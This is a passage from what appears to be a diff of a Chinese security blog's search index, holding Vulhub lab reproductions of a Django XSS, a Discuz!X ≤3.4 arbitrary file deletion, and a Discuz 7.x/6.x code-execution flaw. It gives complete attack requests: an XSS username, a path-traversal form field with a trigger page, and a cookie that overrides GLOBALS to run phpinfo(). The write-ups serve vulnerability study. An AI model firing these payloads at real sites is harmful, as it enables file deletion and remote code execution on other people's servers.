+<li>注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li>
+<li>再次注册一个用户名为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的用户</li>
+<li>触发duplicate key异常，导致XSS漏洞</li>
+</ol>
+<p>访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>创建一个用户，成功；再次访问<code>http://your-ip:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>，触发异常：</p>
+<p>可见，Postgres抛出的异常为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">duplicate key value violates unique constraint &quot;xss_user_username_key&quot;</span><br><span class="line">DETAIL:  Key (username)&#x3D;(&lt;script&gt;alert(1)&lt;&#x2F;script&gt;) already exists.</span><br></pre></td></tr></table></figure>
+
+<p>这个异常被拼接进<code>The above exception () was the direct cause of the following exception</code>，最后触发XSS。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Django</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Discuz!X ≤3.4 任意文件删除漏洞</title>
+    <url>/2021/07/12/Discuz!X%20%E2%89%A43.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Discuz-X-≤3-4-任意文件删除漏洞"><a href="#Discuz-X-≤3-4-任意文件删除漏洞" class="headerlink" title="Discuz!X ≤3.4 任意文件删除漏洞"></a>Discuz!X ≤3.4 任意文件删除漏洞</h1><p>影响版本：Discuz!X ≤3.4</p>
+<p>漏洞详情：<a href="https://lorexxar.cn/2017/09/30/dz-delete/" target="_blank" rel="noopener">https://lorexxar.cn/2017/09/30/dz-delete/</a></p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>安装时，只用修改数据库地址为<code>db</code>，其他保持默认即可：</p>
+<p>访问<code>http://your-ip/robots.txt</code>可见robots.txt是存在的：</p>
+<p><img src="https://image.3001.net/images/20210712/16260659173087.png" alt="image-20210712113726398"></p>
+<p>注册用户后，在个人设置页面找到自己的formhash：</p>
+<p><img src="https://image.3001.net/images/20210712/16260659199806.png" alt="image-20210712114035351"></p>
+<p>带上自己的Cookie、formhash发送如下数据包：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132</span><br><span class="line">Content-Length: 367</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;61.0.3163.79 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en;q&#x3D;0.6</span><br><span class="line">Cookie: kuR_sid&#x3D;Ph7B1z; kuR_visitedfid&#x3D;2; kuR_oldtopics&#x3D;D9D; kuR_fid2&#x3D;1626059361; cX12_2132_saltkey&#x3D;gKvOCcWp; cX12_2132_lastvisit&#x3D;1626057387; cX12_2132_sid&#x3D;dZ5u5n; cX12_2132_sendmail&#x3D;1; cX12_2132_seccode&#x3D;4.cf81c2f22450b44402; cX12_2132_ulastactivity&#x3D;74ad7MDBgeRzQhefqHjDOHWk%2BLDI7N93qzr15Z0Xy9%2BTgoT0M1tT; cX12_2132_auth&#x3D;3c8bbqDUXEphLP2a%2F40d75mQSUODAo%2BlzyHq5c0jDIZ2fUVbZ6zdxI0WT7X2JIAzG9ky9Dh55mhnX1TO9s%2FM; cX12_2132_home_readfeed&#x3D;1626061120; cX12_2132_noticeTitle&#x3D;1; cX12_2132_home_diymode&#x3D;1; cX12_2132_lastact&#x3D;1626061279%09home.php%09spacecp; cX12_2132_checkpm&#x3D;1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;formhash&quot;</span><br><span class="line"></span><br><span class="line">14c44716</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;birthprovince&quot;</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;robots.txt</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;profilesubmit&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryPFvXyxL45f34L12s--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210712/16260659248357.png" alt="image-20210712114323807"></p>
+<p>提交成功之后，用户资料修改页面上的出生地就会显示成下图所示的状态：</p>
+<p><img src="https://image.3001.net/images/20210712/16260659278674.png" alt="image-20210712114416344"></p>
+<p>说明我们的脏数据已经进入数据库了。</p>
+<p>然后，新建一个<code>upload.html</code>，代码如下，将其中的<code>[your-ip]</code>改成discuz的域名，<code>[form-hash]</code>改成你的formhash：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;[your-ip]&#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base&amp;profilesubmit&#x3D;1&amp;formhash&#x3D;[form-hash]&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;birthprovince&quot; &#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用浏览器打开该页面，上传一个正常图片。此时脏数据应该已被提取出，漏洞已经利用结束。</p>
+<p>再次访问<code>http://192.168.44.132/robots.txt</code>，发现文件成功被删除：</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Discuz</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</title>
+    <url>/2021/07/12/Discuz%207.x6.x%20%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><p>由于php5.3.x版本里php.ini的设置里<code>request_order</code>默认值为GP，导致<code>$_REQUEST</code>中不再包含<code>$_COOKIE</code>，我们通过在Cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p>
+<a id="more"></a>
+
+<p>具体原理请参考：</p>
+<ul>
+<li><a href="https://www.secpulse.com/archives/2338.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2338.html</a></li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动Discuz 7.2，启动后，访问<code>http://192.168.44.132:8080/install/</code>来安装discuz，数据库地址填写<code>db</code>，数据库名为<code>discuz</code>，数据库账号密码均为<code>root</code>。</p>
+<p>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<code>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;viewthread.php?tid&#x3D;9&amp;extra&#x3D;page%3D1 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.124 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;forumdisplay.php?fid&#x3D;2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: GLOBALS[_DCACHE][smilies][searcharray]&#x3D;&#x2F;.*&#x2F;eui; GLOBALS[_DCACHE][smilies][replacearray]&#x3D;phpinfo();</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>phpinfo已成功执行：</p>
+<p><img src="https://image.3001.net/images/20210712/16260657953088.png" alt="image-20210712111332661"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Discuz</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>代码审计方法论</title>
     <url>/2021/07/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/</url>
     <content><![CDATA[<h2 id="代码审计方法论"><a href="#代码审计方法论" class="headerlink" title="代码审计方法论"></a>代码审计方法论</h2><a id="more"></a>
